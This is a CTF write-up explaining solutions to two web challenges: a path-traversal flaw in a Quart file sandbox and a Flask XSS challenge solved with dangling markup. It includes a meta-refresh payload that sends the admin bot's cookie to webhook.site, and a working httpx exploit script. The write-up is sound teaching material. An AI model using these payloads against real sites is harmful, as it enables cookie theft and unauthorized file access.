Solves: S.K.I.B.I.D.I. (web), EasyXSSChallenge(web),  S.K.I.B.I.D.I. Revenge(web), Touch Grass(Physical)
I was able to first blood all 3 web challenges and was the reason  S.K.I.B.I.D.I. got a revenge challenge :D
## S.K.I.B.I.D.I.
#langs/python
This challenge involved stealing a flag file in `/app/users/admin/flag`, and were given the ability to run various file system commands. The website uses an async version of flask called Quartz and also seems to have some thread pool for running commands. More suspiciously, there is also a middleware that randomly delays requests, hinting at a potential race condition being used.
```python
app = Quart(__name__)

executor = ThreadPoolExecutor(max_workers=4)
...
# this helps our developers test their apps in high latency environments!
# please ignore the following code 👍
@app.before_request
async def firewall():
    # SUS Race condition blocker?
    await asyncio.sleep(random.randint(1000,3000)/1000)
```
Checking out the `/sandbox` route, we see that we are given the ability to run various methods in `SkibidiSandbox`
```python
user_filesystem = SkibidiSandBox(base_path='users')
allowed_funcs = ['cp', 'get_id', 'list_files', 'mkdir', 'mktempdir', 'rm', 'stat', 'write_file', 'read_file']


@app.route('/sandbox', methods=['GET'])
async def sandbox():
    method = request.args.get('method')
    args = request.args.getlist('args') # Gets all "args" query params as a list

    # Basically only allows functions without __ prefix
    if method not in allowed_funcs:
        return jsonify({'error': 'Invalid method'}), 400

    for arg in args:
        if not isinstance(arg, str):
            return jsonify({'error': 'All arguments must be strings'}), 400
        if len(arg) > 200:
            return jsonify({'error': 'Argument too long'}), 400
    try:
        async_method = getattr(user_filesystem, method)
        import types
        if isinstance(async_method, types.MethodType): # Checks if is a function type
            sig = inspect.signature(async_method)
            arg_count = len(sig.parameters)
        
        if len(args) != arg_count:  
            return jsonify({'error': f'Invalid number of arguments for {method}. Expected {arg_count}, got {len(args)}'}), 400
    except AttributeError:
        return jsonify({'error': f'Method {method} not found'}), 400
    
    try:
        async_method = getattr(user_filesystem, method)
        result = await async_method(*[str(arg) for arg in args])
        return jsonify({'result': result}), 200
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```
So, what is stopping us from reading the flag directly? Lets review the various methods that we can call.
```python
class SkibidiSandBox:
    def __init__(self, base_path, tar_bytes=None, max_workers=4):
        self.base_path = base_path
        self.id = str(uuid.uuid4())
        self.path = f"{self.base_path}/{self.id}"
        self.executor = ThreadPoolExecutor(max_workers=max_workers)
        
        while os.path.exists(self.path):
            self.id = str(uuid.uuid4())
            self.path = f"{self.base_path}/{self.id}"
        
        os.makedirs(self.path)

	...

    def __sanitize_filename(self, filename):
        # remove potentially dangerous characters from the filename
        dangerous_chars = ['{', '}', '\\', ',']
        
        for char in dangerous_chars:
            filename = filename.replace(char, '')
        
        # disallow directory traversal, that would be really bad :(
        while '../' in filename:
            filename = filename.replace('../', '')
            
        return os.path.normpath(filename)
    
    async def __check_file_for_flag(self, file_path):
        if not await self._run_in_executor(os.path.exists, file_path):
            return False, ''
        
        async with aiofiles.open(file_path, 'r') as f:
            file_contents = await f.read()
            if 'sctf' in file_contents:
                return True, 'Flag found in file, not allowed to read it.'
            return False, ''

	...

    async def read_file(self, filename):
        filename = self.__sanitize_filename(filename)
        file_path = os.path.join(self.path, filename)
        
        if not await self._run_in_executor(os.path.exists, file_path):
            raise FileNotFoundError(f"File {file_path} does not exist")
        
        # extra layer of security to prevent funny business!
        banned_files = ['flag', 'root', 'etc', 'passwd', 'proc', 'dev', 'var', 'tmp', 'usr', 'bin']
        
        # make sure we resolve symlinks here for naughty tricks!
        if any(banned in str(Path(filename).resolve()) for banned in banned_files):
            return 'Funny Business Detected! You are not allowed to read this file.'
        
    
        res, message = await self.__check_file_for_flag(file_path)
        if res:
            return message
        
        async with aiofiles.open(file_path, 'r') as f:
            return await f.read()
```
Wow, that is quite a ton of checks. Firstly, `__sanitize_filename()` seems to remove attempts of traversing up directories by removing all `../` found. It also normalises the path before returning it, however it should be noted that normalising a path *does not* actually prevent absolute paths from being used, meaning we can still perform path traversal. The `read_file` method is even stricter, blocking any access to files containing the name `flag` and also to some special directories. It also checks the file contents and blocks any files containing the phrase `sctf`. The read method seems way too restrictive, so we should check out other commands. To relax restrictions, we could perhaps use the copy command to rename the `flag` file. 
```python
    async def cp(self, src, dest):
        src = self.__sanitize_filename(src)
        dest = self.__sanitize_filename(dest)
        src_path = os.path.join(self.path, src)
        dest_path = os.path.join(self.path, dest)
        
        if not await self._run_in_executor(os.path.exists, src_path):
            raise FileNotFoundError(f"Source file {src_path} does not exist.")
        
        
        async with aiofiles.open(src_path, 'rb') as fsrc:
            async with aiofiles.open(dest_path, 'wb') as fdest:
                content = await fsrc.read()
                await fdest.write(content)
                
        return dest_path, src_path
```
While checking code, I realised that given the ability to copy the file from one absolute path to another absolute path, why couldn't I just copy `/app/users/admin/flag` to `/app/static/flag`? The only issue is that the app does not contain a `static` folder by default. This can be easily solved however as we can also create folders with `mkdir`.
```python
    async def mkdir(self, folder):
        folder = self.__sanitize_filename(folder)
        folder_path = os.path.join(self.path, folder)
        await self._run_in_executor(os.makedirs, folder_path, True)
        return folder_path
```

![[firefox_z0aVk1bCNg.mp4]]
Just like that, we are able to get the flag from the server.
`sctf{r4c1ng_1nt0_th3_n1ght}`
## EasyXSSChallenge
#langs/python 
#misc/admin-bot 
As hinted by the challenge name, this is an XSS challenge involving stealing the flag cookie from the admin bot. Given that we know the exploit is most likely XSS of some form, let's see where user input is reflected. What stands out most is the `/serve/<filename>` path:
```python
@app.route("/serve/<filename>", methods=["GET"])
def serve(filename):
    ctx = {"title": f"Serving file: {filename}", **request.args.to_dict()}
    filename = os.path.basename(filename) # no naughty path traversal!
    return render_template(f"user_templates/{filename}", **ctx) # TODO See if any flask args can be injected
```
It will happily render any template we ask it to, with 0 restrictions. It also seems to take any user args provided and pass it to the template. So, what sort of templates can we create?
```python
@app.route("/upload/<filename>", methods=["POST"])
def upload(filename):

    # sanitize out html
    content = request.form.get("content")
    html_blacklist = ["<", ">", "{", "}"]
    for char in html_blacklist:
        content = content.replace(char, urllib.parse.quote_plus(char))
    content = content.replace("config", "")

    # add the title
    content = "{{title}}" + content

    # remove illegal characters from filename
    filename_blacklist = [".", "/", "\\"]
    filename = list(filename)
    for i, char in enumerate(filename):
        if char in filename_blacklist:
            filename.pop(i) # SUS modification of list during iteration
    
    # one more time, to be safe
    filename = os.path.basename("".join(filename))
    
    # add a file extension if needed
    if not "." in filename:
        # TODO We can control the file extension
        filename = filename + ".html"

    with open(f"templates/user_templates/{filename}", "w") as w:
        w.write(content)

    return "ok!"
```
When reviewing the code for `/upload/<filename>` a very specific piece of code stood out to me:
```python
    # remove illegal characters from filename
    filename_blacklist = [".", "/", "\\"]
    filename = list(filename)
    for i, char in enumerate(filename):
        if char in filename_blacklist:
            filename.pop(i) # SUS modification of list during iteration
```
This looked *very* similar to [[YesbutNo 2024 Qual Writeups#RentAHitman 1]], a past CTF challenge where I had tunnel visioned myself and failed to catch the removal. 
> For example, the filename `he..llo` only has the first `.` removed, resulting in the filename being `he.llo`

This time, I almost immediately recognised that this code allows us to sneak in banned characters, which would've explained this after the blacklist.
```python
    # one more time, to be safe
    filename = os.path.basename("".join(filename))
```
[`path.basename()`](https://docs.python.org/3/library/os.path.html#os.path.basename) simply takes the last component of a path(The filename) and returns it, meaning any attempts at path traversal will still be blocked. Next, there is another piece of code which adds a default file extension of `.html` if there isn't already one
```python
    # add a file extension if needed
    if not "." in filename:
        # TODO We can control the file extension
        filename = filename + ".html"
```
This is another suspicious bit because usually, we wouldn't have been able to choose the file extension anyway(If not for that bug above). So far, the vulnerability from the filename handling seems to be being able to pick arbitrary file extensions, which we will return to later. Now, we should go back to review how our templates are handled.
```python
    # sanitize out html
    content = request.form.get("content")
    html_blacklist = ["<", ">", "{", "}"]
    for char in html_blacklist:
        content = content.replace(char, urllib.parse.quote_plus(char))
    content = content.replace("config", "")

    # add the title
    content = "{{title}}" + content
```
It seems all `<>{}` gets encoded, effectively preventing us from putting any html tags or template expressions into our template. The valid template expression is the `{{title}}` variable inserted before our content. We seem to have hit a dead end for now, so let's review how the served templates are displayed. We notice that the bot doesn't actually visit `/serve`, but instead `/render`:
```python
def admin_bot(params):
	...
    driver = webdriver.Chrome(options=options)

    try:
        # Step 2: Visit localhost and set flag cookie
        driver.get("http://localhost:38457/")  # Initial visit required before setting cookies
        driver.add_cookie({"name": "flag", "value": FLAG, "domain": "localhost"})

        # Step 3: Visit render endpoint with params
        target_url = f"http://localhost:38457/render?{params}"
        print(f"Bot visiting {target_url}")
        driver.get(target_url)

        # Let JS run for a few seconds
        time.sleep(3)
	...
```
The render function has nothing special going on
```python
@app.route("/render", methods=["GET"])
def render():
    return render_template("render.html")
```
so let's just check what is rendered instead.
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Here is your rendered document</title>
</head>
<body>
    <div id="content"></div>
    <script src="{{url_for('static', filename='render.js')}}"></script>
</body>
</html>
```
Interestingly, nothing much here too, except for some js
```js
function getQueryParams() {
  const params = new URLSearchParams(window.location.search);
  const result = {};
  for (const [key, value] of params.entries()) {
    result[key] = value; // TODO PP possible here
    /*
    Potential fields:
    params.filename, window.location, window.location.search,

     */
  }
  return result;
}

params = getQueryParams();

fetch(`/serve/${params.filename}${window.location.search}`).then(response => {
    return response.text();
  }).then(data => {
    document.querySelector("#content").innerHTML = `Here is your rendered content!
${data}
${document.cookie}
Enjoy! :'>`;
  });
```
This is where the template display functionality comes from. The page gets the window's query parameters and assigns them to an object. 
> It should be noted that the code here is vulnerable to prototype pollution but I couldn't find a way to exploit it.

We then get the server to render the actual template based on the filename query parameter, passing on the query parameters too. No sanitisation of the returned content is done and the result is directly put in `innerHTML`. Interestingly, `document.cookie` is appended to our template for some reason, which will be useful later(Hint: Dangling markup). Also, I forgot to mention this earlier but the server does apply a pretty strict CSP, as seen from
```python
@app.after_request
def apply_csp(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'; style-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none';"
    # script-src 'self' can be problematic if you host JSONP, AngularJS or user uploaded files.
    return response
```
Lets consolidate what we know so far:
* Strict CSP where we can't run any js
* Being unable to create templates with tags or expressions, except for the `{{title}}` which is added by default
* Suspicious cookie insert right after the rendered content
* Very odd bug and file extension check where we can control file extensions
At this point, I knew with dangling markup, I could steal the flag with a rendered template like:
```html
<meta http-equiv="refresh" content=\'0; url=https://webhook?x=
```
But how would we get that? I remembered jinja had something where you could mark it as [safe](https://jinja.palletsprojects.com/en/stable/templates/#working-with-automatic-escaping). I was wondering if passing something that wasn't a string to `title` could somehow get it marked as safe when stringified, but a quick gemini chat told me it wasn't possible. But hold up, what and when does Flask consider something is safe? 
![[Pasted image 20250801222422.png]] 
(Thanks gemini)
Checking the [docs](https://flask.palletsprojects.com/en/stable/templating/#jinja-setup), flask only escapes specific files:
> "autoescaping is enabled for all templates ending in .html, .htm, .xml, .xhtml, as well as .svg when using render_template()."

This means if we pass in a `.txt` file and ask flask to render it, no escaping is done on expressions. With that, we can conveniently place our payload in the `{{title}}` and have it rendered raw. 
In conclusion:
1. Abuse file name filter to get an extension that flask won't apply auto escaping on
2. Use dangling markup payload as `title` query parameter to feed to the template
3. Send report to admin bot with our payload
4. Template renders the tags properly without any sanitisation and we snag the html(and the inserted cookie) after the payload
```python
import httpx
import uuid
from urllib.parse import urlencode

target = "http://localhost:5000"
target = "http://finals1.sieberr.live:16004"

with httpx.Client() as c:
    name = uuid.uuid4().hex
    name = "testfileblah"
    html = '<meta http-equiv="refresh" content=\'0; url=https://webhook.site/...?x='
    res = c.post(f"{target}/upload/{name}..txt", data={"content":"blahblah"})
    res.raise_for_status()
    print("Uploaded")
    query = {"title": html, "filename": f"{name}.txt"}
    query = urlencode(query)
    res = c.post(f"{target}/report", data={"params": query})
    res.raise_for_status()
```
With that, we get our flag: `sctf{i_l0v3_xss_ch4ll3ng3s}`
